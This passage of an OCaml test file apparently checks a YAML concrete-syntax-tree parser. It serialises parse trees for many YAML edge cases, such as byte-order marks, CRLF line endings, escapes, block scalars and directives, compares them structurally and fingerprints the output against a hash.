          ("items", Json.Array (List.map yaml_layout_evidence items));
        ]
  | Decorated decorated ->
      Json.Object
        [
          ("kind", Json.String "decorated");
          ("span", Span.to_json decorated.span);
          ("value", yaml_layout_evidence decorated.value);
        ]
  | Invalid invalid ->
      Json.Object
        [ ("kind", Json.String "invalid"); ("span", Span.to_json invalid.span) ]

let yaml_tree_evidence (label, source) =
  let file = "yaml-edge-" ^ label ^ ".yml" in
  let tree = Yaml_cst.parse ~file source in
  Json.Object
    [
      ("label", Json.String label);
      ("source_sha256", Json.String (Sha256.digest_string source));
      ("print_sha256", Json.String (Sha256.digest_string (Yaml_cst.print tree)));
      ("bom", Json.Bool tree.bom);
      ("newline", Json.String (yaml_newline_name tree.newline));
      ( "documents",
        Json.Array
          (List.map
             (fun (document : Yaml_cst.document) ->
               Json.Object
                 [
                   ("span", Span.to_json document.span);
                   ( "root",
                     Option.fold ~none:Json.Null ~some:Yaml_cst.node_to_json
                       document.root );
                   ( "layout",
                     Option.fold ~none:Json.Null ~some:yaml_layout_evidence
                       document.root );
                   ( "directives",
                     Json.Array
                       (List.map
                          (fun (trivia : Yaml_cst.trivia) ->
                            Json.Object
                              [
                                ("raw", Json.String trivia.raw);
                                ("span", Span.to_json trivia.span);
                              ])
                          document.directives) );
                 ])
             tree.documents) );
      ( "trivia",
        Json.Array
          (List.map
             (fun (trivia : Yaml_cst.trivia) ->
               Json.Object
                 [
                   ("kind", Json.String (yaml_trivia_name trivia.kind));
                   ("raw", Json.String trivia.raw);
                   ("span", Span.to_json trivia.span);
                 ])
             tree.trivia) );
      ( "anchors",
        Json.Array
          (List.map
             (fun (name, anchored) ->
               Json.Object
                 [
                   ("name", Json.String name);
                   ("node", Yaml_cst.node_to_json anchored);
                 ])
             tree.anchors) );
      ("problems", Json.Array (List.map yaml_problem_json tree.problems));
      ( "validation",
        Json.Array
          (List.map yaml_issue_json (Yaml_validation.validate ~file source)) );
      ("events", Json.String (Yaml_event.of_cst tree |> Yaml_event.to_string));
    ]

let invalid_tree raw reason =
  let node = Yaml_cst.Invalid { raw; reason; span = Span.none } in
  {
    Yaml_cst.file = "manual-invalid.yml";
    source = raw;
    bom = false;
    newline = `None;
    documents = [ { root = Some node; directives = []; span = Span.none } ];
    trivia = [];
    anchors = [];
    problems = [];
  }

let yaml_structural_evidence () =
  let parsed source = Yaml_cst.parse ~file:"structural.yml" source in
  let root_path = parsed "root:\n  child: value\n" in
  let path_value =
    match Yaml_cst.root root_path with
    | None -> Json.Null
    | Some root -> (
        match Yaml_cst.get_path root [ "root"; "child" ] with
        | None -> Json.Null
        | Some value -> Yaml_cst.node_to_json value)
  in
  let anchor_tree = parsed "root: [&x value, *x]\n" in
  Json.Object
    [
      ("path", path_value);
      ( "anchor",
        Option.fold ~none:Json.Null ~some:Yaml_cst.node_to_json
          (Yaml_cst.resolve_alias anchor_tree "x") );
      ( "equal-identical",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "a: one\n") (parsed "a: one\n")) );
      ( "different-value",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "a: one\n") (parsed "a: two\n")) );
      ( "different-key",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "a: one\n") (parsed "b: one\n")) );
      ( "different-kind",
        Json.Bool (Yaml_cst.structural_equal (parsed "a\n") (parsed "- a\n")) );
      ( "invalid-reason",
        Json.Bool
          (Yaml_cst.structural_equal
             (invalid_tree "raw" "left")
             (invalid_tree "raw" "right")) );
      ( "invalid-identical",
        Json.Bool
          (Yaml_cst.structural_equal
             (invalid_tree "raw" "reason")
             (invalid_tree "raw" "reason")) );
      ( "invalid-raw",
        Json.Bool
          (Yaml_cst.structural_equal
             (invalid_tree "left" "reason")
             (invalid_tree "right" "reason")) );
    ]

let yaml_edge_oracle () =
  let sources =
    [
      ("crlf", "root:\r\n  child: value\r\n");
      ("bom-only", "\239\187\191");
      ("partial-bom-first", "\239ab: value\n");
      ("partial-bom-second", "a\187c: value\n");
      ("partial-bom-indicator", "\239XY---\nvalue\n");
      ("escaped-mapping-key", "\"a\\\\\\\"b\": value\n");
      ("empty-quoted-key", "\"\": value\n");
      ("unicode-boundary", "value: \"\\u07FF\"\n");
      ("empty-folded", "value: >+\n  \n  \n");
      ("unterminated-quote", "value: \"\n  continued\n");
      ("flow-spans", "root: [&x value, *x]\n");
      ("blank-block", "value: |+\n  \n  \n");
      ("alias-colon", "&x value\n*x:\n");
      ("alias-colon-only", "*x:\n");
      ("sequence-indent", "root:\n  - item\n");
      ("explicit-empty", "? key\n:\n");
      ("explicit-colon-only", ":\n");
      ("explicit-no-value", "? key\n");
      ("explicit-followed-implicit", "? key\nnext: value\n");
      ("merge-key", "base: &base {a: b}\nmerged:\n  <<: *base\n");
      ("empty-at-eof", "key:\n");
      ("empty-at-eof-no-newline", "key:");
      ("empty-quoted", "value: \"\"\n");
      ("bom-document", "\239\187\191---\nkey: value\n");
      ( "document-boundaries",
        "# lead\n%YAML 1.2\n---\na: b\n...\n# between\n---\nc: d\n" );
      ("vertical-tab", "value: \"\\v\"\n");
      ("invalid-percent-tag", "%TAG !e! tag:%GG:\n---\nvalue: !e!thing data\n");
      ("escaped-quotes", "value: \"escaped \\\\\\\" # still value\"\n");
      ("single-doubled", "value: 'it''s: fine' # comment\n");
      ("property-quoted", "value: &a 'x:y'\n");
      ("bad-block-suffix", "value: |x\n  data\n");
      ("same-indent-block-end", "value: |\nnext: value\n");
      ("zero-version", "%YAML 0.1\n---\nvalue\n");
      ("flow-escape", "value: [\"a\\\\\\\"b\", c]\n");
      ("block-comment-indent", "value: |\n# same indent\nnext: value\n");
      ("block-leading-space", "value: |\n   \n  content\n");
    ]
  in
  Json.Object
    [
      ("trees", Json.Array (List.map yaml_tree_evidence sources));
      ("structural", yaml_structural_evidence ());
      ( "manual_vertical_tab",
        Json.String
          (Yaml_event.to_line
             (Yaml_event.Scalar
                {
                  value = "\011";
                  style = Yaml_cst.Double_quoted;
                  anchor = None;
                  tag = None;
                })) );
    ]
  |> fingerprint "yaml-edges"
       "5ee0e7411ad2db69da5d6812d328db52cd3faa5c6786b978d92e33a2ba9cf4fc"

let () =
  Printexc.record_backtrace true;
  (try script_oracle ()
   with error ->
     record_failure "script oracle raised: %s" (Printexc.to_string error));
  (try config_oracle ()
   with error ->
     record_failure "config oracle raised: %s" (Printexc.to_string error));
  (try semantic_oracle ()
   with error ->
     record_failure "semantic oracle raised: %s" (Printexc.to_string error));
  (try semantic_edge_oracle ()
   with error ->
     record_failure "semantic edge oracle raised: %s" (Printexc.to_string error));
  (try config_edge_oracle ()
   with error ->
     record_failure "config edge oracle raised: %s" (Printexc.to_string error));
  (try yaml_edge_oracle ()
   with error ->
     record_failure "YAML edge oracle raised: %s" (Printexc.to_string error));
  match List.rev !failures with
  | [] -> Printf.printf "mutation semantic oracles passed\n%!"
  | messages ->
      List.iter
        (fun message -> Printf.eprintf "not ok - %s\n%!" message)
        messages;
      exit 1
